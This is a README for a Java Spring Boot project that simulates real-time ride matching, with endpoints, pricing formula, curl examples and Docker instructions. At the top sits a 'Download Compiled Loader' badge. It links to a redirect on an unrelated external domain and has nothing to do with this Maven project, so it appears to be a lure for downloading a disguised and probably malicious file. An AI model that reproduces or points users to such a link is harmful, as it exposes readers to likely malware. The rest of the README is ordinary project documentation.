# Real-Time Ride Matching Platform

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

A Spring Boot backend system that simulates real-time ride matching between passengers and drivers based on proximity, driver availability, system load, dynamic pricing, and event-driven state changes.

This project is inspired by ride-sharing platforms such as Uber and Ola and focuses on backend engineering concepts such as:

- Low-latency driver matching
- Geospatial distance calculation
- Driver availability management
- Duplicate assignment prevention
- Event-driven architecture simulation
- Dynamic pricing / surge calculation
- Dashboard metrics
- REST API design
- Dockerized deployment

---

## Tech Stack

| Category | Technology |
|---|---|
| Language | Java 17 |
| Backend | Spring Boot 3 |
| APIs | REST APIs |
| Database | H2 In-Memory DB |
| Persistence | Spring Data JPA / Hibernate |
| Documentation | Swagger / OpenAPI |
| Monitoring | Spring Boot Actuator |
| Architecture Concepts | Geospatial Matching, Event-Driven Design, Dynamic Pricing, Load-Aware Matching |
| Deployment | Docker, Docker Compose |

---

## Architecture

```text
Client
  |
  v
Ride API / Driver API
  |
  v
Matching Service
  |
  +--> Driver Repository / Location Store
  |
  +--> Dynamic Pricing Service
  |
  +--> Event Publisher
  |
  v
Ride Assignment + Event Logs
```

---

## Core Features

### 1. Driver Location Updates

Drivers can continuously send location updates.

```http
POST /api/drivers/location
```

### 2. Driver Availability

Drivers can be marked as:

- AVAILABLE
- ASSIGNED
- ON_TRIP
- OFFLINE

```http
POST /api/drivers/status
```

### 3. Ride Request Matching

Passengers can request rides using pickup coordinates.

```http
POST /api/rides/request
```

The matching service:

1. Finds available drivers.
2. Calculates distance using Haversine formula.
3. Filters drivers within radius.
4. Scores candidates using distance, load and rating.
5. Assigns best driver.
6. Prevents duplicate assignment by rechecking driver state.
7. Stores ride and event logs.

### 4. Dynamic Pricing

Fare is calculated using:

```text
fare = (baseFare + perKmFare * distanceKm) * surgeMultiplier
```

Surge multiplier is based on demand-supply ratio.

### 5. Event Logs

Kafka is simulated through persistent event logs.

Example event types:

- RIDE_REQUESTED
- DRIVER_ASSIGNED
- DRIVER_REJECTED
- RIDE_COMPLETED
- NO_DRIVER_FOUND
- DRIVER_LOCATION_UPDATED

### 6. Dashboard

```http
GET /api/dashboard
```

Shows:

- Total drivers
- Available drivers
- Total rides
- Matched rides
- Failed matches
- Match success rate
- Demand-supply ratio
- Current surge multiplier

---

## API Endpoints

| Method | Endpoint | Description |
|---|---|---|
| POST | `/api/drivers/location` | Add/update driver location |
| POST | `/api/drivers/status` | Update driver availability |
| GET | `/api/drivers` | List all drivers |
| POST | `/api/rides/request` | Request a ride |
| POST | `/api/rides/{rideId}/reject` | Simulate driver rejection and rematch |
| POST | `/api/rides/{rideId}/complete` | Complete a ride |
| GET | `/api/rides/{rideId}` | Get ride status |
| GET | `/api/rides` | List all rides |
| GET | `/api/rides/{rideId}/events` | Get ride event logs |
| GET | `/api/dashboard` | Get system metrics |

---

## How to Run Locally

### Prerequisites

- Java 17+
- Maven 3.8+
- Git

### Run

```bash
mvn spring-boot:run
```

Application runs at:

```text
http://localhost:8080
```

Swagger UI:

```text
http://localhost:8080/swagger-ui.html
```

H2 Console:

```text
http://localhost:8080/h2-console
```

H2 credentials:

```text
JDBC URL: jdbc:h2:mem:ridematchdb
Username: sa
Password:
```

---

## Example API Calls

### Request Ride

```bash
curl -X POST http://localhost:8080/api/rides/request \
  -H "Content-Type: application/json" \
  -d '{
    "userId": "user-101",
    "pickupLatitude": 28.6139,
    "pickupLongitude": 77.2090,
    "dropLatitude": 28.5355,
    "dropLongitude": 77.3910
  }'
```

### Update Driver Location

```bash
curl -X POST http://localhost:8080/api/drivers/location \
  -H "Content-Type: application/json" \
  -d '{
    "driverId": "drv-200",
    "name": "New Driver",
    "latitude": 28.6140,
    "longitude": 77.2100,
    "rating": 4.7
  }'
```

### Update Driver Status

```bash
curl -X POST http://localhost:8080/api/drivers/status \
  -H "Content-Type: application/json" \
  -d '{
    "driverId": "drv-200",
    "status": "AVAILABLE"
  }'
```

---

## Run with Docker

```bash
docker compose up --build
```

---

## Future Enhancements

- Redis GEO integration using GEOADD and GEORADIUS
- Real Apache Kafka topics for ride events
- PostgreSQL persistence
- WebSocket location streaming
- ETA prediction
- Route optimization
- ML-based demand prediction
- Region-based partitioning
- Kubernetes deployment manifests
- Prometheus/Grafana monitoring

---

## Author

Kunal Kumar  
GitHub: https://github.com/kunal7216
